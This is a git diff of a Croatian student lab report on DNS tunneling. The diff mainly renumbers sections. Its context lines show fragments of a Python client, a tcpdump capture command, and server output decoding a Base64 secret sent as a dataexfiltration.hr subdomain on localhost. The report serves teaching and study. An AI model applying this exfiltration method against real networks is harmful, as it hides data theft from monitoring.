@@ -64,15 +64,11 @@ Logika simuliranog napada uključuje nekoliko ključnih koraka:
 
 6. Obrada i rekonstrukcija podataka na strani poslužitelja - kada simulirani DNS server primi upit, on detektira i dekodira skrivene informacije te rekonstruira originalnu tajnu poruku.
 
-## 2.3. Postavljanje radnog okruženja
-
-Tekst
-
-## 2.4. Kod
+## 2.3. Praktični dio
 
 U sklopu praktičnog dijela rada implementiran je jednostavan DNS poslužitelj u programskom jeziku Python koji služi za demonstraciju DNS tunnelinga. Poslužitelj obrađuje dolazne DNS zahtjeve, iz imena domene izdvaja skrivenu poruku kodiranu u Base64 formatu te je dekodira na strani napadača. Time se ilustrira kako je moguće prenijeti proizvoljne podatke unutar DNS prometa.
 
-### 2.4.1. Poslužitelj - dns_server.py
+### 2.3.1. Poslužitelj - dns_server.py
 
 Na početku skripte uvoze se potrebni moduli:
 
@@ -165,7 +161,8 @@ if __name__ == "__main__":
 
 
 Ovo omogućuje da se DNS poslužitelj pokrene samo kada se skripta izvršava izravno, dok se logika može ponovno koristiti i kao modul u drugim programima.
-## 2.4.2. Klijent - client.py
+
+## 2.3.2. Klijent - client.py
 
 import dns.message
 import dns.query
@@ -194,9 +191,9 @@ if __name__ == "__main__":
 
     transmit_dns_tunnel_message(server_ip, domain, msg, port=server_port)
 
-## 2.5. Slanje poruke i snimanje prometa
+## 2.4. Slanje poruke i snimanje prometa
 
-### 2.5.1. tcmdump
+### 2.4.1. tcmdump
 
 Snimio sam pakete koji idu na portu 5354.
 
@@ -204,7 +201,7 @@ sudo tcpdump -i lo udp port 5354 -w dns_tunnel.pcap
 
 Objasnjenje
 
-### 2.5.2. Pokretanje DNS servera
+### 2.4.2. Pokretanje DNS servera
 
 Otvorio sam drugi terminal i u njemu pokrenuo
 
@@ -215,7 +212,7 @@ I dobio poruku:
 
 Starting DNS server on 0.0.0.0:5354
 
-### 2.5.3. Pokretanje klijenta i slanje poruke
+### 2.4.3. Pokretanje klijenta i slanje poruke
 
 Otvorio sam treći terminal i pokrenuo:
 
@@ -239,7 +236,7 @@ T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr. 300 IN A 127.0.0.1
 ;AUTHORITY
 ;ADDITIONAL
 
-### 2.5.3. Čitanje tajne poruke
+### 2.4.3. Čitanje tajne poruke
 
 donat@donat-VirtualBox:~/dns_tunnel$ python3 dns_server.py
 DNS server is running on 0.0.0.0:5354
@@ -247,7 +244,7 @@ Received DNS request for: T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr. from
 Decoded secret: Ova poruka je tajna.
 Responding with IP: 127.0.0.1
 
-### 2.5.4. Zaustavljanje tcpdump-a
+### 2.4.4. Zaustavljanje tcpdump-a
 
 Kada sam zaustavio tcpdump dobio sam 
 
@@ -258,7 +255,7 @@ donat@donat-VirtualBox:~$ ^C
 
 Te sam dobio datoteku dns_tunnel.pcap.
 
-### 2.6. Analiza prometa u Wiresharku
+### 2.5. Analiza prometa u Wiresharku
 
 
 
